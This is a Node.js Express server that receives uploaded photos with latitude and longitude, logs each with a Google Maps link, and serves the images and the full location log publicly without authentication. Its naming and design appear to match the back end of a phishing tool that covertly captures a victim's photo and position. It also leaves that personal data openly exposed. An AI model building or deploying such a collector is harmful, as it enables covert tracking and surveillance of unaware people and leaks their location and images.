const express = require("express");
const multer = require("multer");
const fs = require("fs");
require("dotenv").config();

const app = express();

/* =========================
   ENSURE UPLOADS FOLDER
========================= */
if (!fs.existsSync("uploads")) {
  fs.mkdirSync("uploads");
}

/* =========================
   SERVE UPLOADED IMAGES
========================= */
app.use("/uploads", express.static("uploads"));

/* =========================
   MULTER STORAGE CONFIG
========================= */
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, "uploads/");
  },
  filename: (req, file, cb) => {
    const timestamp = Date.now();
    cb(null, `capture_${timestamp}.png`);
  }
});

const upload = multer({
  storage,
  fileFilter: (req, file, cb) => {
    if (
      file.mimetype === "image/png" ||
      file.mimetype === "image/jpeg"
    ) {
      cb(null, true);
    } else {
      cb(new Error("Only PNG and JPEG allowed"));
    }
  }
});

/* =========================
   CORS
========================= */
app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  res.setHeader("Access-Control-Allow-Methods", "POST,GET");
  next();
});

/* =========================
   CAPTURE ROUTE
========================= */
app.post("/capture", upload.single("photo"), (req, res) => {
  const { latitude, longitude } = req.body;

  const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;

  const log = `
Time: ${new Date().toISOString()}
Latitude: ${latitude}
Longitude: ${longitude}
Google Maps: ${mapLink}
Image URL: /uploads/${req.file.filename}
-------------------------
`;

  fs.appendFileSync("location-log.txt", log);
  res.status(200).send("Captured successfully");
});

/* =========================
   VIEW LOGS ONLINE
========================= */
app.get("/logs", (req, res) => {
  if (!fs.existsSync("location-log.txt")) {
    return res.send("No data captured yet.");
  }

  const data = fs.readFileSync("location-log.txt", "utf8");
  res.type("text").send(data);
});

/* =========================
   SERVER START
========================= */
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
